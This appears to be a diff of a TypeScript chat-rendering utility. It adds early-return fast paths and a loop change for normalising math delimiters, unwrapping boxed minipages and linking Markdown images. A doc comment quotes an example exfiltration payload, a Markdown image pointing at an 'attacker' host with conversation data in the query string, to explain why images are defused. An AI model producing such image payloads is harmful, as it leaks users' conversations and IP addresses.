@@ -17,7 +17,10 @@ function replaceBracketDisplayMath(content: string, style: DisplayMathStyle): st
   let opening = -1
   let depth = 0
   for (let index = 0; index < content.length - 1; index += 1) {
-    if (content[index] !== '\\' || isEscaped(content, index)) continue
+    // The increment below consumes both characters of every backslash escape,
+    // so this loop never visits an escaped backslash. Looking backwards here
+    // would rescan the same prefix for every pair in a long backslash run.
+    if (content[index] !== '\\') continue
     const delimiter = content[index + 1]
     if (delimiter === '[') {
       if (depth === 0) opening = index
@@ -106,6 +109,7 @@ export interface MathDelimiterOptions {
 
 /** Normalize common LLM math delimiters while preserving ordinary currency and literal dollar signs. */
 export function normalizeMathDelimiters(content: string, options: MathDelimiterOptions = {}): string {
+  if (!content.includes('$') && !content.includes('\\')) return content
   const style = options.displayMathStyle ?? 'single-line'
   const parts = content.split(/(```[\s\S]*?```|`[^`\n]+`)/g)
   return parts.map((part, index) => {
@@ -126,6 +130,9 @@ const boxedMinipage = /\\\[\s*\\boxed\{\s*\\begin\{minipage\}\{[^}\n]+\}([\s\S]*
 
 /** Unwrap `\[\boxed{\begin{minipage}...}\]` documents into Markdown prose with their equations intact. */
 export function unwrapBoxedMinipages(content: string): string {
+  // Search for the distinctive word: a leading-backslash needle repeatedly
+  // matches the first character of long escape runs in some string engines.
+  if (!content.includes('boxed')) return content
   return content.split(/(```[\s\S]*?```|`[^`\n]+`)/g).map((part, index) => {
     if (index % 2 === 1) return part
     return part.replace(boxedMinipage, (_match, body: string) => {
@@ -146,6 +153,7 @@ export function unwrapBoxedMinipages(content: string): string {
  * `![](https://attacker/?d=...)` would leak conversation data and the reader's IP address.
  */
 export function linkMarkdownImages(content: string): string {
+  if (!content.includes('![')) return content
   return content.split(/(```[\s\S]*?```|`[^`\n]+`)/g).map((part, index) => {
     if (index % 2 === 1) return part
     let result = ''
